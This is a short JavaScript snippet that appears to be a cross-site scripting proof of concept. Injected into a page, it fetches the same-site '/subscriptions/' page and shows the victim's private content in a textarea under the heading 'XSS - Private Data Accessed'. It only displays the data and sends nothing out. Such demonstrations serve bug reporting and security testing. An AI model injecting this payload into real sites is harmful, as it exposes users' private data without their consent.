fetch('/subscriptions/')
  .then(r => r.text())
  .then(html => {
    document.body.innerHTML = '<h1>XSS - Private Data Accessed:</h1><textarea style="width:100%;height:800px">' + html + '</textarea>';
  });
